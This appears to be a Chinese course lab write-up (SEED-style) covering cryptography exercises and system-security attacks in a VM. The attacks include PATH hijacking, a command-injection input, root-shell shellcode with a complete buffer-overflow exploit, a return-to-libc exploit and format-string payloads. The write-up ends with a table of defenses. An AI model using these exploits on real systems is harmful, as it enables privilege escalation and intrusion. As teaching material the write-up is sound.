# CS5293 软件安全实验：从密码学到缓冲区溢出

> 两份课程作业的合集——用密码学原语理解加密边界，用栈溢出理解系统信任模型。

---

# Part I · Assignment 1: 密码学实验

## Task 1 — 频率分析破解单表替换密码

> 本 Task 采用 VibeCoding 模式完成：确定方案后由 AI 生成代码，通过后写入项目。

### 密文

```
lrvmnir bpr sumvbwvr jx bpr lrvmnir ber clsjx lwvr pr
wjrzber bpr xjvber lrvmnir ber ewrber lrvmnir
```

### 破解思路

使用频率分析 + 爬山算法，以英文 bigram 频率作为评分标准，自动搜索最佳置换映射。

### 代码实现

```python
import random
import math
import string

# 英文字母频率（来自大规模语料）
english_freq = {
    'a':8.167, 'b':1.492, 'c':2.782, 'd':4.253, 'e':12.702, 'f':2.228,
    'g':2.015, 'h':6.094, 'i':6.966, 'j':0.153, 'k':0.772, 'l':4.025,
    'm':2.406, 'n':6.749, 'o':7.507, 'p':1.929, 'q':0.095, 'r':5.987,
    's':6.327, 't':9.056, 'u':2.758, 'v':0.978, 'w':2.360, 'x':0.150,
    'y':1.974, 'z':0.074
}

# 英文常见 bigram 频率
english_bigrams = {
    'th':3.56, 'he':3.07, 'in':2.43, 'er':2.05, 'an':1.99, 're':1.85,
    'on':1.76, 'at':1.49, 'en':1.45, 'nd':1.35, 'ti':1.34, 'es':1.34,
    'or':1.28, 'te':1.20, 'of':1.17, 'ed':1.17, 'is':1.13, 'it':1.12,
    'al':1.09, 'ar':1.07, 'st':1.05, 'to':1.05, 'nt':1.04, 'ng':0.95,
    'se':0.93, 'ha':0.93, 'as':0.87, 'ou':0.87, 'io':0.83, 'le':0.83,
    've':0.83, 'co':0.79, 'me':0.79, 'de':0.76, 'hi':0.76, 'ri':0.73,
    'ro':0.73, 'ic':0.70, 'ne':0.69, 'ea':0.69, 'ra':0.62, 'ce':0.65
}

def score_text(text):
    """根据 bigram 频率对明文进行评分，越高越像英文"""
    text = text.lower()
    sc = 0.0
    for i in range(len(text)-1):
        bg = text[i:i+2]
        if bg in english_bigrams:
            sc += math.log(english_bigrams[bg])
    return sc

def decrypt_with_key(ciphertext, key_map):
    """使用给定映射解密"""
    result = []
    for c in ciphertext:
        if c.lower() in key_map:
            d = key_map[c.lower()]
            result.append(d.upper() if c.isupper() else d)
        else:
            result.append(c)
    return ''.join(result)

def hill_climbing(ciphertext, iterations=20000):
    """爬山算法搜索最优密钥映射"""
    letters = list(string.ascii_lowercase)
    best_key = dict(zip(letters, random.sample(letters, 26)))
    best_score = score_text(decrypt_with_key(ciphertext, best_key))

    for _ in range(iterations):
        new_key = best_key.copy()
        a, b = random.sample(letters, 2)
        new_key[a], new_key[b] = new_key[b], new_key[a]

        new_text = decrypt_with_key(ciphertext, new_key)
        new_score = score_text(new_text)

        if new_score > best_score:
            best_key = new_key
            best_score = new_score

    return best_key, best_score

ciphertext = ("lrvmnir bpr sumvbwvr jx bpr lrvmnir ber clsjx lwvr pr "
              "wjrzber bpr xjvber lrvmnir ber ewrber lrvmnir")

# 多次随机重启取最优
best_overall_key = None
best_overall_score = -float('inf')

for attempt in range(50):
    key, score = hill_climbing(ciphertext, iterations=30000)
    if score > best_overall_score:
        best_overall_score = score
        best_overall_key = key

plaintext = decrypt_with_key(ciphertext, best_overall_key)
print(f"最佳明文: {plaintext}")
print(f"评分: {best_overall_score:.2f}")
```

### 手动微调映射

通过分析高频词 `bpr` → `the`，`ber` → `and` 等锚点进行局部修正。

最终结果使用 `tr` 命令验证：

```bash
echo "lrvmnir bpr sumvbwvr jx bpr lrvmnir ber clsjx lwvr pr wjrzber bpr xjvber lrvmnir ber ewrber lrvmnir" | tr 'a-z' 'yhoautkzgpxfnesdjbrcvwliqm'
```

> 解密结果：**premier the opposite of the premier and basic name he another the former premier and greater premier**

---

## Task 2 — 使用不同密码和模式加密

分别使用 AES-128-CBC、BF-CBC、AES-128-CFB 对同一文件加密：

```bash
echo -n "This is a test message for encryption." > plain.txt

# AES-128-CBC
openssl enc -aes-128-cbc -e -in plain.txt -out cipher1.bin \
  -K 00112233445566778889aabbccddeeff -iv 0102030405060708

# Blowfish-CBC
openssl enc -bf-cbc -e -in plain.txt -out cipher2.bin \
  -K 00112233445566778889aabbccddeeff -iv 0102030405060708

# AES-128-CFB
openssl enc -aes-128-cfb -e -in plain.txt -out cipher3.bin \
  -K 00112233445566778889aabbccddeeff -iv 0102030405060708
```

解密验证：

```bash
openssl enc -aes-128-cbc -d -in cipher1.bin -out dec1.txt \
  -K 00112233445566778889aabbccddeeff -iv 0102030405060708
cat dec1.txt
```

查看加密文件大小差异：

```bash
ls -l cipher*.bin
```

---

## Task 3 — ECB vs. CBC 模式对图片加密

```bash
# ECB 加密
openssl enc -aes-128-ecb -e -in pic_original.bmp -out pic_ecb.bin \
  -K 00112233445566778889aabbccddeeff -iv 0000000000000000

# CBC 加密
openssl enc -aes-128-cbc -e -in pic_original.bmp -out pic_cbc.bin \
  -K 00112233445566778889aabbccddeeff -iv 0102030405060708

# 保留 BMP 头部 + 替换加密数据
head -c 54 pic_original.bmp > header
tail -c +55 pic_ecb.bin > body_ecb
tail -c +55 pic_cbc.bin > body_cbc
cat header body_ecb > new_ecb.bmp
cat header body_cbc > new_cbc.bmp
```

**现象：ECB 模式下图像轮廓依然可见（相同颜色块加密后结果相同），CBC 模式下图像完全混乱。**

> ECB 相同明文块加密成相同密文块，泄露了图像模式；CBC 通过链接使相同块加密结果不同。

---

## Task 4 — 填充机制分析

```bash
# 四种模式加密对比
openssl enc -aes-128-ecb -e -in plain.txt -out test_ecb.bin \
  -K 00112233445566778889aabbccddeeff
openssl enc -aes-128-cbc -e -in plain.txt -out test_cbc.bin \
  -K 00112233445566778889aabbccddeeff -iv 0102030405060708
openssl enc -aes-128-cfb -e -in plain.txt -out test_cfb.bin \
  -K 00112233445566778889aabbccddeeff -iv 0102030405060708
openssl enc -aes-128-ofb -e -in plain.txt -out test_ofb.bin \
  -K 00112233445566778889aabbccddeeff -iv 0102030405060708

ls -l plain.txt test_*.bin
```

**结论：CFB/OFB 是流模式，不需要填充；ECB/CBC 是块模式，需要填充到块大小倍数。**

### PKCS#5 填充观察

```bash
echo -n "12345" > f5.txt           # 5 字节
echo -n "1234567890" > f10.txt     # 10 字节
echo -n "1234567890123456" > f16.txt  # 16 字节

# 加密
openssl enc -aes-128-cbc -e -in f5.txt -out f5.enc \
  -K 00112233445566778889aabbccddeeff -iv 0102030405060708
openssl enc -aes-128-cbc -e -in f10.txt -out f10.enc \
  -K 00112233445566778889aabbccddeeff -iv 0102030405060708
openssl enc -aes-128-cbc -e -in f16.txt -out f16.enc \
  -K 00112233445566778889aabbccddeeff -iv 0102030405060708

# 使用 -nopad 解密，保留填充数据
openssl enc -aes-128-cbc -d -nopad -in f5.enc -out f5.dec \
  -K 00112233445566778889aabbccddeeff -iv 0102030405060708
xxd f5.dec
xxd f10.dec
xxd f16.dec
```

**PKCS#5 填充规则：每个填充字节的值等于填充的长度。16 字节文件加密后变为 32 字节——增加了一整个填充块。**

---

## Task 5 — 错误传播

对 1000+ 字节文件分别以 ECB/CBC/CFB/OFB 加密，修改第 55 字节的一个比特：

```bash
for f in long_ecb.enc long_cbc.enc long_cfb.enc long_ofb.enc; do
    python3 -c "
with open('$f', 'r+b') as fh:
    fh.seek(54)
    b = fh.read(1)
    fh.seek(54)
    fh.write(bytes([b[0] ^ 1]))
"
done
```

解密后对比差异：

| 模式 | 错误传播范围 |
|------|-------------|
| **ECB** | 只影响损坏密文所在的块（16 字节） |
| **CBC** | 影响损坏块及其后一个块 |
| **CFB** | 影响损坏字节及后续一个块 |
| **OFB** | 仅损坏对应位置的明文比特（密钥流独立） |

---

## Task 6 — 初始向量 (IV) 的安全性

### IV 唯一性实验

```bash
# 相同密钥 + 相同 IV → 相同密文
openssl enc -aes-128-cbc -e -in same.txt -out same_iv1.enc \
  -K 00112233445566778889aabbccddeeff -iv 0102030405060708
openssl enc -aes-128-cbc -e -in same.txt -out same_iv2.enc \
  -K 00112233445566778889aabbccddeeff -iv 0102030405060708
cmp same_iv1.enc same_iv2.enc  # 完全相同

# 相同密钥 + 不同 IV → 不同密文
openssl enc -aes-128-cbc -e -in same.txt -out diff_iv1.enc \
  -K 00112233445566778889aabbccddeeff -iv 1111111111111111
openssl enc -aes-128-cbc -e -in same.txt -out diff_iv2.enc \
  -K 00112233445566778889aabbccddeeff -iv 2222222222222222
cmp diff_iv1.enc diff_iv2.enc  # 不同
```

**IV 保证了相同明文在不同加密中产生不同密文，防止模式识别和重放攻击。**

### OFB 已知明文攻击

```python
def ofb_known_plaintext_attack(p1_str, c1_hex, c2_hex):
    p1_bytes = p1_str.encode('ascii')
    c1_bytes = bytes.fromhex(c1_hex)
    c2_bytes = bytes.fromhex(c2_hex)

    min_len = min(len(p1_bytes), len(c1_bytes), len(c2_bytes))
    p1_bytes, c1_bytes, c2_bytes = p1_bytes[:min_len], c1_bytes[:min_len], c2_bytes[:min_len]

    # 恢复密钥流
    keystream = bytes(a ^ b for a, b in zip(p1_bytes, c1_bytes))
    # 解密 P2
    p2_bytes = bytes(a ^ b for a, b in zip(c2_bytes, keystream))
    return p2_bytes.decode('ascii', errors='replace')

P1 = "This is a known message!"
C1 = "a469b1c502c1cab966965e50425438e1bb1b5f9037a4c159"
C2 = "bf73bcd3509299d566c35b5d450337e1bb175f903fafc159"
print("恢复的 P2:", ofb_known_plaintext_attack(P1, C1, C2))
```

### 可预测 IV 攻击（CBC 模式）

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import binascii

def bytes_xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def attack_simulation(actual_plaintext):
    key = binascii.unhexlify("00112233445566778899aabbccddeeff")
    iv1 = binascii.unhexlify("31323334353637383930313233343536")
    iv2 = binascii.unhexlify("31323334353637383930313233343537")

    p1 = pad(actual_plaintext.encode(), 16)
    cipher = AES.new(key, AES.MODE_CBC, iv1)
    c1 = cipher.encrypt(p1)

    # 构造 P2 使得 CBC 加密后等价于猜测值
    guess_yes = pad(b"Yes", 16)
    p2 = bytes_xor(bytes_xor(iv2, iv1), guess_yes)
    cipher2 = AES.new(key, AES.MODE_CBC, iv2)
    c2 = cipher2.encrypt(p2)

    if c2 == c1:
        print("攻击成功: P1 是 Yes!")
    else:
        print("攻击结果: P1 不是 Yes")

attack_simulation("Yes")
attack_simulation("No")
```

**攻击仅需一次加密询问，即可确定 P1 的内容。**

---

## Task 7 — 编程使用 Crypto 库破解密钥

```python
import binascii
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def try_decrypt(word, ciphertext, iv):
    key = word.encode('ascii')
    if len(key) >= 16:
        return None
    key = key + b'\x23' * (16 - len(key))  # 用 '#' 填充到 16 字节

    cipher = AES.new(key, AES.MODE_CBC, iv)
    try:
        decrypted = cipher.decrypt(ciphertext)
        plain = unpad(decrypted, AES.block_size)
        return plain
    except (ValueError, KeyError):
        return None

plain_expected = b"This is a top secret."
ciphertext = binascii.unhexlify(
    "764aa26b55a4da654df6b19e4bce00f4ed05e09346fb0e762583cb7da2ac93a2")
iv = binascii.unhexlify("aabbccddeeff00998877665544332211")

with open("words.txt", 'r', encoding='utf-8', errors='ignore') as f:
    for i, line in enumerate(f):
        word = line.strip()
        if not word or len(word) >= 16:
            continue
        plain = try_decrypt(word, ciphertext, iv)
        if plain == plain_expected:
            print(f"找到密钥单词: {word}")
            break
```

---

# Part II · Assignment 2: 系统安全实验

> **运行环境：** SEED Ubuntu 20.04 VM（32-bit x86 编译）

---

## Task 2 — 环境变量与 Set-UID 程序

### 2.1 操作环境变量

```bash
printenv          # 打印所有环境变量
export foo='test string'
printenv foo      # → test string
unset foo
printenv foo      # 无输出
```

### 2.2 环境变量继承

编写程序打印所有环境变量，编译为 Set-UID root：

```c
#include <stdio.h>
#include <stdlib.h>
extern char **environ;
void main() {
    int i = 0;
    while (environ[i] != NULL) {
        printf("%s\n", environ[i]);
        i++;
    }
}
```

```bash
gcc -o foo setuidenv.c
sudo chown root foo && sudo chmod 4755 foo
export PATH=$PATH:/tmp/mydir
export LD_LIBRARY_PATH=/tmp/mylibs
export MY_CUSTOM_VAR='hello_from_user'
./foo | grep -E 'LD_LIBRARY_PATH|MY_CUSTOM_VAR|PATH'
```

| 环境变量 | 是否被继承 | 原因 |
|---|---|---|
| `PATH` | ✅ | 不被安全机制过滤 |
| `LD_LIBRARY_PATH` | ❌ | 动态链接器忽略 Set-UID 程序的 LD_* 变量 |
| `MY_CUSTOM_VAR` | ✅ | 自定义变量正常继承 |

### 2.3 PATH 环境变量攻击

```c
int main() {
    system("ls");  // 使用相对路径——危险！
    return 0;
}
```

创建恶意 `ls` 程序：

```c
#include <stdio.h>
#include <unistd.h>
int main() {
    printf("[!] This is MY ls program - I hijacked the call!\n");
    printf("My effective uid is: %d\n", geteuid());
    return 0;
}
```

```bash
export PATH=.:$PATH
./myls
# euid=0 → 以 root 权限运行了我们的代码
```

**修复：始终使用绝对路径 `system("/bin/ls")`。**

### 2.4 LD_PRELOAD 实验

| 场景 | real UID | effective UID | LD_PRELOAD 生效？ |
|------|----------|---------------|--------------------|
| 普通程序 + 普通用户 | 1000 | 1000 | ✅ |
| Set-UID root + 普通用户 | 1000 | 0 | ❌ |
| Set-UID root + root 用户 | 0 | 0 | ✅ |
| Set-UID user1 + 其他用户 | 1000 | user1 | ❌ |

**结论：** `real UID ≠ effective UID` 时，动态链接器自动清除 LD_PRELOAD。

### 2.5 system() vs execve()

| | system() | execve() |
|---|---|---|
| 调用机制 | 通过 `/bin/sh -c` | 直接替换进程映像 |
| 命令注入 | ✅ 存在 | ❌ 不存在 |
| PATH 影响 | ✅ 受 PATH 影响 | 使用绝对路径 |

```bash
# system() → 命令注入成功
./catfile "/etc/passwd; touch /tmp/pwned"
# execve() → 整个字符串被当作文件名，攻击失效
```

### 2.6 Capability Leaking

```c
void main(){
    int fd = open("/etc/zzz", O_RDWR | O_APPEND);  // euid=0 时打开
    setuid(getuid());  // 放弃权限
    // fd 仍然有效！
    if (fork()) { close(fd); exit(0); }
    else { write(fd, "Malicious Data\n", 15); close(fd); }
}
```

**`setuid()` 不会关闭已打开的文件描述符——权限放弃了，能力却泄漏了。**

---

## Task 3 — 缓冲区溢出攻击

### 3.1 环境准备

```bash
sudo sysctl -w kernel.randomize_va_space=0  # 关闭 ASLR
sudo ln -sf /bin/zsh /bin/sh                # 绕过 dash 防护
```

### 3.2 Shellcode 分析

| 机器码 | 汇编 | 作用 |
|---|---|---|
| `\x31\xc0` | `xorl %eax, %eax` | eax 清零 |
| `\x50` | `pushl %eax` | 压入 NULL |
| `\x68//sh` | `pushl $0x68732f2f` | 压入 `//sh` |
| `\x68/bin` | `pushl $0x6e69622f` | 压入 `/bin` |
| `\x89\xe3` | `movl %esp, %ebx` | ebx → 字符串地址 |
| `\xb0\x0b` | `movb $0x0b, %al` | execve 系统调用号 |
| `\xcd\x80` | `int $0x80` | 触发系统调用 |

等价于 `execve("/bin//sh", ["/bin//sh", NULL], NULL)`。

### 3.3 漏洞程序

```c
int bof(char *str) {
    char buffer[24];
    strcpy(buffer, str);  // 溢出！
    return 1;
}
```

```
高地址
+------------------+
|  返回地址 (RA)   |  ← 攻击目标
+------------------+
|  保存的 ebp      |  4 字节
+------------------+
|  buffer[0..23]   |  24 字节
+------------------+
低地址
```

### 3.4 漏洞利用 — exploit.c

```c
char shellcode[] =
    "\x31\xc0\x50\x68//sh\x68/bin"
    "\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

void main(int argc, char **argv) {
    char buffer[517];
    memset(&buffer, 0x90, 517);           // NOP sled

    long ret    = 0xffffcb98 + 200;       // buffer 地址 + 偏移
    int  offset = 36;                      // 到返回地址的距离

    *(long *)(buffer + offset) = ret;      // 覆盖返回地址
    int sc_len = sizeof(shellcode) - 1;
    memcpy(buffer + (517 - sc_len), shellcode, sc_len);

    FILE *badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
```

```bash
gcc -m32 -o exploit exploit.c
./exploit && ./stack
# whoami → root
```

### 3.5 绕过 dash 防护

在 shellcode 开头加入 `setuid(0)` 调用：

```c
"\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"   // setuid(0)
"\x31\xc0\x50\x68//sh\x68/bin"        // execve("/bin/sh")
"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
```

`setuid(0)` 使 `real UID == effective UID == 0`，dash 不再降权。

### 3.6 ASLR 暴力破解

```bash
sudo sysctl -w kernel.randomize_va_space=2
# 32 位系统栈随机化约 2^15 种可能，配合 NOP sled 可暴力破解
while [ 1 ]; do ./stack; done
```

### 3.7–3.8 保护机制对比

| 保护机制 | 原理 | 攻击效果 |
|----------|------|---------|
| **StackGuard** | 在 buffer 和 ebp 之间插入随机 canary | 溢出触发 `stack smashing detected` |
| **NX/DEP** | 栈内存标记为不可执行 | 跳转到栈上 shellcode 触发段错误 |

---

## Task 4 — Return-to-libc 攻击

### 攻击原理

不注入 shellcode，而是将返回地址覆盖为 libc 中 `system()` 的地址，参数为 `/bin/sh`。

```
高地址
+---------------------------+
| &"/bin/sh"  (参数)        |
+---------------------------+
| exit() 地址  (返回地址)    |
+---------------------------+
| system() 地址 (覆盖 RA)   |
+---------------------------+
| saved ebp                 |
+---------------------------+
| buffer[0..23]             |
+---------------------------+
低地址
```

### 获取关键地址

```bash
gdb -q retlib_dbg
(gdb) break main
(gdb) run
(gdb) p system    # → 0xf7dc98e0
(gdb) p exit      # → 0xf7db85b0
```

### exploit.c

```c
int main(int argc, char **argv) {
    char buf[250];
    memset(buf, 0xaa, sizeof(buf));

    *(long *) &buf[38] = 0xf7dc98e0;  // system()
    *(long *) &buf[42] = 0xf7db85b0;  // exit()
    *(long *) &buf[46] = 0xffffd147;  // "/bin/sh"

    FILE *badfile = fopen("./badfile", "w");
    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);
}
```

### ASLR 与 StackGuard 的影响

- **ASLR 开启：** libc 地址 + 栈地址同时随机化，三个关键地址全部失效
- **StackGuard 开启：** 溢出仍会修改 canary，`stack smashing detected` 终止程序

---

## Task 5 — 格式化字符串漏洞

### 漏洞代码

```c
scanf("%s", user_input);
printf(user_input);       // 直接将用户输入作为格式字符串！
```

### 5.1 崩溃程序

```bash
echo -e "1\n%s%s%s%s%s" | ./vul_prog
# → Segmentation fault
```

### 5.2 读取 secret[1]

```bash
# 将 secret[1] 地址作为整数输入，用 %9$s 读取
echo -e "1448452516\n%9\$s" | ./vul_prog
# → 输出 'U'（0x55 的 ASCII）
```

### 5.3 修改 secret[1]

```bash
echo -e "1448452516\n%9\$n" | ./vul_prog
# %n 将已输出字符数写入 secret[1] 地址
```

### 5.4 精确修改为 0x50（80）

```bash
echo -e "1448452516\n%8x.%8x.%8x.%8x.%8x.%8x.%8x.%17x%n" | ./vul_prog
# 前 7 个 %8x. = 63 字符 + %17x = 17 字符 = 80 → secret[1] = 0x50
```

### 格式化字符串攻击技术对比

| 目的 | 格式符 | 效果 |
|------|--------|------|
| 崩溃 | `%s%s...` | 读取无效地址，段错误 |
| 读取 | `%x...%s` | 跳过栈值，读取目标地址的字符串 |
| 修改 | `%x...%n` | 写入已输出字节数到目标地址 |
| 精确修改 | `%Nx...%n` | 控制输出字节数 → 精确写入 |

---

## 总结与防护

| 漏洞类型 | 根本原因 | 防护方案 |
|---------|---------|----------|
| 环境变量滥用 | Set-UID 信任用户环境 | 绝对路径；清理 LD_* |
| 缓冲区溢出 | `strcpy()` 无边界检查 | `strncpy` + ASLR + StackGuard + NX |
| Return-to-libc | NX 不防代码重用 | ASLR + StackGuard + CFI |
| 格式字符串 | `printf(user_input)` | 始终用 `printf("%s", input)` |

**深度防御层次：**

```
代码级    → 安全编程（边界检查、格式字符串固定、最小权限）
编译器级  → StackGuard（canary）、PIE
OS 级     → ASLR、NX/DEP
硬件级    → Intel CET（控制流强制技术）
```
